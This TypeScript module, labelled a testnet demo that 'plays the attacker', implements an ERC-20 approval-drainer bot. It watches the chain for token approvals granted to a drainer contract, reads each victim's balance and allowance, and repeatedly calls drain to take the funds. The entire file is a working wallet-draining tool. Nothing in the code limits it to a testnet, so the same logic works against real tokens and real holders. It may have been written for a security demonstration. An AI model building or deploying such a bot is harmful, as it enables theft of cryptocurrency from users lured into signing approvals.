import { decodeAbiParameters, encodeFunctionData, keccak256, pad, parseAbi, toHex, type Address, type Hex } from 'viem';
import { erc20Abi } from '@copeybara/core';
import type { Quorum } from '@copeybara/quorum';

/** TESTNET DEMO ONLY: plays the attacker. Watches approvals to the demo drainer and drains them. */
export const APPROVAL_TOPIC = keccak256(toHex('Approval(address,address,uint256)'));
const drainAbi = parseAbi(['function drain(address token, address victim) returns (uint256)']);
const allowanceAbi = parseAbi(['function allowance(address owner, address spender) view returns (uint256)']);
const MAX_ATTEMPTS = 3;

export interface DrainRecord {
  victim: Address;
  token: Address;
  amount: bigint;
  approveTx: Hex;
  drainTx: Hex | null;
  at: number;
  note?: string;
}

export interface DrainerBotOpts {
  q: Quorum;
  send: (to: Address, data: Hex) => Promise<Hex>;
  drainer: Address;
  tokens: Address[];
  fromBlock: bigint;
  pollMs?: number;
  now?: () => number;
}

export function createDrainerBot(o: DrainerBotOpts) {
  const now = o.now ?? Date.now;
  const records: DrainRecord[] = [];
  const pending = new Map<string, { rec: DrainRecord; attempts: number }>();
  const seen = new Set<string>();
  let cursor = o.fromBlock;
  let timer: ReturnType<typeof setInterval> | null = null;
  let running = false;

  async function attempt(key: string) {
    const p = pending.get(key)!;
    p.attempts++;
    try {
      p.rec.drainTx = await o.send(o.drainer, encodeFunctionData({ abi: drainAbi, functionName: 'drain', args: [p.rec.token, p.rec.victim] }));
      pending.delete(key);
    } catch (e) {
      if (p.attempts >= MAX_ATTEMPTS) {
        p.rec.note = `drain failed after ${MAX_ATTEMPTS} attempts: ${(e as Error).message}`;
        pending.delete(key);
      }
    }
  }

  async function tick(): Promise<DrainRecord[]> {
    const head = await o.q.pinBlock();
    if (head >= cursor) {
      const logs = await o.q.getLogs({ address: o.tokens, topics: [APPROVAL_TOPIC, null, pad(o.drainer).toLowerCase() as Hex] }, cursor, head);
      for (const l of logs) {
        const [value] = decodeAbiParameters([{ type: 'uint256' }], l.data);
        const token = l.address;
        const victim = `0x${l.topics[1]!.slice(26)}` as Address;
        const key = `${token.toLowerCase()}|${victim.toLowerCase()}|${l.transactionHash}`;
        if (value === 0n || seen.has(key)) continue;
        seen.add(key);
        const [bal, allowed] = await Promise.all([
          o.q.read({ address: token, abi: erc20Abi, functionName: 'balanceOf', args: [victim] }, head),
          o.q.read({ address: token, abi: allowanceAbi, functionName: 'allowance', args: [victim, o.drainer] }, head),
        ]);
        const amount = bal < allowed ? bal : allowed;
        const rec: DrainRecord = { victim, token, amount, approveTx: l.transactionHash, drainTx: null, at: now() };
        records.push(rec);
        if (amount === 0n) {
          rec.note = 'nothing to take';
          continue;
        }
        pending.set(key, { rec, attempts: 0 });
      }
      cursor = head + 1n;
    }
    for (const key of [...pending.keys()]) await attempt(key);
    return [...records];
  }

  return {
    tick,
    records: () => [...records],
    start() {
      timer ??= setInterval(() => {
        if (running) return;
        running = true;
        tick().catch(() => {}).finally(() => (running = false));
      }, o.pollMs ?? 2000);
    },
    stop() {
      if (timer) clearInterval(timer);
      timer = null;
    },
  };
}
